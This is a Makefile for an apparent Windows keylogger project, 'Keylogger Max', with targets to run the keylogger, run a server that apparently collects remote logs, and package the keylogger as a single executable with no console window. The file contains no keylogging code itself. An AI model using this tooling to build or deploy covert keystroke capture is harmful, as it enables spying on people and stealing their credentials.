VENV_DIR = venv
PYTHON = $(VENV_DIR)/Scripts/python.exe
PIP = $(VENV_DIR)/Scripts/pip.exe

.PHONY: all install run_keylogger run_server clean build

all: install run_server

install:
	@echo "Setting up virtual environment and installing dependencies..."
	python -m venv $(VENV_DIR)
	$(PIP) install -r requirements.txt
	@echo "Installation complete."

run_keylogger:
	@echo "Starting Keylogger Max for Windows... (Press Ctrl+C to stop)"
	$(PYTHON) keyloggermax.py

run_server:
	@echo "Starting server..."
	$(PYTHON) server.py

build:
	@echo "Building executable..."
	$(PIP) install pyinstaller
	$(VENV_DIR)/Scripts/pyinstaller --onefile --windowed keyloggermax.py
	@echo "Build complete. Executable is in the 'dist' directory."

clean:
	@echo "Cleaning up generated files and virtual environment..."
	rm -rf $(VENV_DIR)
	rm -rf remote_logs
	rm -rf dist
	rm -rf build
	rm -f keyloggermax.spec
	@echo "Cleanup complete."